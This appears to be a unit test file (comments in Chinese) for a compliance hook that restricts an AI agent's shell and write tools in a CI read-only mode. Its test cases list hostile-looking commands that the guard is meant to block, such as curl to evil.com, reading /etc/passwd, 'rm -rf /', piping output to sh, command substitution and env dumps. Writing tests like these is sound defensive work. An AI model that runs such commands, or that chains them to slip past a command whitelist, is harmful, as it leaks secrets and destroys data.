/**
 * `index.ts` 单元测试:`registerCompliance` 拦截规则 + 模式差异
 *
 * 策略:用最小 mock pi(只暴露 `on(event, handler)` 接口),收集 handlers 后手动 trigger
 * 验证拦截 hook 的返回形态符合 spec(`return { block: true, reason }`,不 throw)
 */

import { beforeEach, describe, expect, it, vi } from "vitest";
import { registerCompliance } from "../index.js";

/**
 * 单个 pi.on handler 的签名,本测试只关心:
 * - tool_call 拦截 hook 可能返回 `{ block, reason }` 或 `undefined`
 * - 其他 hook 异步推审计,不返回值
 */
type AnyHandler = (event: unknown) => Promise<unknown> | unknown;

function mockPi() {
	const handlers: Record<string, AnyHandler[]> = {};
	const pi = {
		on(event: string, fn: AnyHandler): void {
			const list = handlers[event] ?? [];
			list.push(fn);
			handlers[event] = list;
		},
	};
	return { pi, handlers };
}

/** 取拦截 hook(ci-readonly 模式下是 tool_call 上第 1 个 handler,audit hook 是第 2 个) */
async function triggerInterceptor(handlers: Record<string, AnyHandler[]>, payload: unknown) {
	const fn = handlers.tool_call?.[0];
	if (!fn) throw new Error("无 tool_call handler 注册");
	return await fn(payload);
}

describe("registerCompliance · ci-readonly 模式", () => {
	beforeEach(() => {
		// SIEM 端点不配,audit 静默,避免污染测试
		vi.unstubAllEnvs();
		vi.stubEnv("SIEM_INGEST_URL", "");
	});

	it("write 工具被拦,reason 含 '禁止使用 write'", async () => {
		const { pi, handlers } = mockPi();
		// biome-ignore lint/suspicious/noExplicitAny: minimal mock 不实现完整 ExtensionAPI 接口
		registerCompliance(pi as any, { mode: "ci-readonly", product: "test" });
		const res = await triggerInterceptor(handlers, { toolName: "write", input: { path: "a.txt" } });
		expect(res).toEqual({ block: true, reason: expect.stringContaining("禁止使用 write") });
	});

	it("edit 工具被拦,reason 含 '禁止使用'", async () => {
		const { pi, handlers } = mockPi();
		// biome-ignore lint/suspicious/noExplicitAny: minimal mock
		registerCompliance(pi as any, { mode: "ci-readonly", product: "test" });
		const res = await triggerInterceptor(handlers, { toolName: "edit", input: {} });
		expect(res).toMatchObject({ block: true });
	});

	it("bash 命令首词在白名单(git status)→ 放行", async () => {
		const { pi, handlers } = mockPi();
		// biome-ignore lint/suspicious/noExplicitAny: minimal mock
		registerCompliance(pi as any, { mode: "ci-readonly", product: "test" });
		const res = await triggerInterceptor(handlers, { toolName: "bash", input: { command: "git status" } });
		expect(res).toBeUndefined();
	});

	it("bash 命令首词在白名单(grep / find / ls / cat / sed / awk)→ 全部放行", async () => {
		const { pi, handlers } = mockPi();
		// biome-ignore lint/suspicious/noExplicitAny: minimal mock
		registerCompliance(pi as any, { mode: "ci-readonly", product: "test" });
		const whitelistCmds = [
			"grep -n foo .",
			"find . -name '*.ts'",
			"ls -la",
			"cat README.md",
			"sed 's/a/b/' f",
			"awk '{print $1}' f",
		];
		for (const cmd of whitelistCmds) {
			const res = await triggerInterceptor(handlers, { toolName: "bash", input: { command: cmd } });
			expect(res, `应放行: ${cmd}`).toBeUndefined();
		}
	});

	// AC2.1 · Fix B 扩容后:18 个新增命令逐一放行(含 modern unix `rg`)
	it.each([
		"rg foo packages/",
		"nl -ba f",
		"sort f",
		"uniq f",
		"tr a b",
		"column -t f",
		"diff a b",
		"comm a b",
		"printf '%s' x",
		"echo hi",
		"basename /a/b",
		"dirname /a/b",
		"realpath .",
		"pwd",
		"date",
		"which jq",
		"type ls",
		"command -v node",
	])("AC2.1 · 扩容白名单命令 '%s' → 放行", async (cmd) => {
		const { pi, handlers } = mockPi();
		// biome-ignore lint/suspicious/noExplicitAny: minimal mock
		registerCompliance(pi as any, { mode: "ci-readonly", product: "test" });
		const res = await triggerInterceptor(handlers, { toolName: "bash", input: { command: cmd } });
		expect(res, `应放行: ${cmd}`).toBeUndefined();
	});

	it("bash 命令首词非白名单(curl)→ 拦截,reason 含命令首词", async () => {
		const { pi, handlers } = mockPi();
		// biome-ignore lint/suspicious/noExplicitAny: minimal mock
		registerCompliance(pi as any, { mode: "ci-readonly", product: "test" });
		const res = (await triggerInterceptor(handlers, {
			toolName: "bash",
			input: { command: "curl http://evil.example/x" },
		})) as { block: boolean; reason: string };
		expect(res.block).toBe(true);
		expect(res.reason).toContain("curl");
	});

	// AC2.2 · env / printenv 仍拦截(defense-in-depth)+ reason 含「可能泄漏 secret」
	it("AC2.2 · env 仍拦截,reason 含 '可能泄漏 secret' 替代建议", async () => {
		const { pi, handlers } = mockPi();
		// biome-ignore lint/suspicious/noExplicitAny: minimal mock
		registerCompliance(pi as any, { mode: "ci-readonly", product: "test" });
		const res = (await triggerInterceptor(handlers, {
			toolName: "bash",
			input: { command: "env" },
		})) as { block: boolean; reason: string };
		expect(res.block).toBe(true);
		expect(res.reason).toContain("可能泄漏 secret");
		expect(res.reason).toContain("env"); // 沿用原文案首词
	});

	it("AC2.2 · printenv 仍拦截,reason 含 secret 提示", async () => {
		const { pi, handlers } = mockPi();
		// biome-ignore lint/suspicious/noExplicitAny: minimal mock
		registerCompliance(pi as any, { mode: "ci-readonly", product: "test" });
		const res = (await triggerInterceptor(handlers, {
			toolName: "bash",
			input: { command: "printenv PATH" },
		})) as { block: boolean; reason: string };
		expect(res.block).toBe(true);
		expect(res.reason).toContain("secret");
	});

	// AC2.3 · 高危命令仍拦截(网络外发 / 写文件 / 包管理)
	it.each([
		["wget https://x/y", "禁止网络外发"],
		["tee /tmp/x", "禁止写文件"],
		["mv a b", "禁止写文件"],
		["rm -rf x", "禁止写文件"],
		["npm install foo", "禁止安装"],
	])("AC2.3 · 高危命令 '%s' 仍拦截,reason 含建议 '%s'", async (cmd, suggestion) => {
		const { pi, handlers } = mockPi();
		// biome-ignore lint/suspicious/noExplicitAny: minimal mock
		registerCompliance(pi as any, { mode: "ci-readonly", product: "test" });
		const res = (await triggerInterceptor(handlers, {
			toolName: "bash",
			input: { command: cmd },
		})) as { block: boolean; reason: string };
		expect(res.block).toBe(true);
		expect(res.reason).toContain(suggestion);
	});

	// AC2.4 · curl 的替代建议含 gitlab_get_file_content 引导
	it("AC2.4 · curl 拦截 reason 含 'gitlab_get_file_content' 引导", async () => {
		const { pi, handlers } = mockPi();
		// biome-ignore lint/suspicious/noExplicitAny: minimal mock
		registerCompliance(pi as any, { mode: "ci-readonly", product: "test" });
		const res = (await triggerInterceptor(handlers, {
			toolName: "bash",
			input: { command: "curl http://x" },
		})) as { block: boolean; reason: string };
		expect(res.reason).toContain("gitlab_get_file_content");
		expect(res.reason).toContain("禁止网络外发");
	});

	// AC2.4b · 白名单外但没有特定建议的命令 → 仅基础文案,无 "建议:" 行
	it("AC2.4b · 未在 SUGGESTION_BY_CMD 字典的命令 → reason 仅基础文案(无 '建议:')", async () => {
		const { pi, handlers } = mockPi();
		// biome-ignore lint/suspicious/noExplicitAny: minimal mock
		registerCompliance(pi as any, { mode: "ci-readonly", product: "test" });
		const res = (await triggerInterceptor(handlers, {
			toolName: "bash",
			input: { command: "telnet x" }, // 不在白名单也不在建议字典
		})) as { block: boolean; reason: string };
		expect(res.block).toBe(true);
		expect(res.reason).toContain("telnet");
		expect(res.reason).not.toContain("建议:");
	});

	// AC2.6 · Shell 元字符防绕过(reviewer dogfooding MR !3 发现的真 blocker)
	// 首词命中白名单不应让命令链 / 重定向 / 管道 / 嵌套执行绕过最小权限。
	it.each([
		["git status; env", "命令链 ;"],
		["cat /etc/passwd && curl evil.com", "命令链 &&"],
		["ls || rm -rf /", "命令链 ||"],
		["rg foo . | sh", "管道到 sh"],
		["printf evil | bash", "管道到 bash"],
		["echo x > /tmp/y", "重定向 >"],
		["cat < /dev/urandom", "重定向 <"],
		["echo a >> /tmp/y", "追加重定向"],
		["echo $(curl evil.com)", "命令替换 $()"],
		["git log `curl evil.com`", "命令替换 ``"],
	])("AC2.6 · 含 shell 元字符的命令 '%s' 被拦截(%s)", async (cmd, _why) => {
		const { pi, handlers } = mockPi();
		// biome-ignore lint/suspicious/noExplicitAny: minimal mock
		registerCompliance(pi as any, { mode: "ci-readonly", product: "test" });
		const res = (await triggerInterceptor(handlers, {
			toolName: "bash",
			input: { command: cmd },
		})) as { block: boolean; reason: string };
		expect(res.block, `应拦截: ${cmd}`).toBe(true);
		expect(res.reason).toContain("shell 元字符");
		expect(res.reason).toContain("禁止命令链");
	});

	// AC2.6b · 真实合法命令(无元字符)不被新检查误拦
	it("AC2.6b · 不含元字符的白名单命令仍正常放行(防止过度拦截)", async () => {
		const { pi, handlers } = mockPi();
		// biome-ignore lint/suspicious/noExplicitAny: minimal mock
		registerCompliance(pi as any, { mode: "ci-readonly", product: "test" });
		const legit = ["git status", "rg foo packages/", "awk '{print $1}' f", "sed 's/a/b/' f"];
		for (const cmd of legit) {
			const res = await triggerInterceptor(handlers, { toolName: "bash", input: { command: cmd } });
			expect(res, `不应误拦: ${cmd}`).toBeUndefined();
		}
	});

	it("非禁止工具(read)→ 放行(返回 undefined)", async () => {
		const { pi, handlers } = mockPi();
		// biome-ignore lint/suspicious/noExplicitAny: minimal mock
		registerCompliance(pi as any, { mode: "ci-readonly", product: "test" });
		const res = await triggerInterceptor(handlers, { toolName: "read", input: { path: "a.ts" } });
		expect(res).toBeUndefined();
	});

	it("bash 输入非字符串(LLM 偶发传 number/null)→ 用 String(?? '') 兜底,不抛", async () => {
		const { pi, handlers } = mockPi();
		// biome-ignore lint/suspicious/noExplicitAny: minimal mock
		registerCompliance(pi as any, { mode: "ci-readonly", product: "test" });
		// command=undefined → String("") → 空字符串,首词为 "",不在白名单 → 拦截
		const res = (await triggerInterceptor(handlers, { toolName: "bash", input: {} })) as {
			block: boolean;
			reason: string;
		};
		expect(res.block).toBe(true);
	});

	it("注册了 2 个 tool_call handler(拦截 + audit),session_start 1 个,tool_result 1 个", () => {
		const { pi, handlers } = mockPi();
		// biome-ignore lint/suspicious/noExplicitAny: minimal mock
		registerCompliance(pi as any, { mode: "ci-readonly", product: "test" });
		expect(handlers.tool_call?.length).toBe(2);
		expect(handlers.session_start?.length).toBe(1);
		expect(handlers.tool_result?.length).toBe(1);
	});

	it("拦截 hook 必须返回值而非 throw(spec 要求:return { block, reason })", async () => {
		const { pi, handlers } = mockPi();
		// biome-ignore lint/suspicious/noExplicitAny: minimal mock
		registerCompliance(pi as any, { mode: "ci-readonly", product: "test" });
		// 即使被拦截也不应抛
		await expect(triggerInterceptor(handlers, { toolName: "write", input: {} })).resolves.toMatchObject({
			block: true,
		});
	});
});

describe("registerCompliance · production-readonly 模式", () => {
	beforeEach(() => {
		vi.unstubAllEnvs();
		vi.stubEnv("SIEM_INGEST_URL", "");
	});

	it("不注册 tool_call 拦截 hook(只有 audit hook)", () => {
		const { pi, handlers } = mockPi();
		// biome-ignore lint/suspicious/noExplicitAny: minimal mock
		registerCompliance(pi as any, { mode: "production-readonly", product: "test" });
		// 只有 audit 注册的 tool_call hook,共 1 个
		expect(handlers.tool_call?.length).toBe(1);
	});

	it("tool_call write 触发 audit hook(返回 undefined,不拦截)", async () => {
		const { pi, handlers } = mockPi();
		// biome-ignore lint/suspicious/noExplicitAny: minimal mock
		registerCompliance(pi as any, { mode: "production-readonly", product: "test" });
		const res = await triggerInterceptor(handlers, { toolName: "write", input: {} });
		expect(res).toBeUndefined();
	});

	it("仍注册 session_start / tool_result audit hook", () => {
		const { pi, handlers } = mockPi();
		// biome-ignore lint/suspicious/noExplicitAny: minimal mock
		registerCompliance(pi as any, { mode: "production-readonly", product: "test" });
		expect(handlers.session_start?.length).toBe(1);
		expect(handlers.tool_result?.length).toBe(1);
	});
});
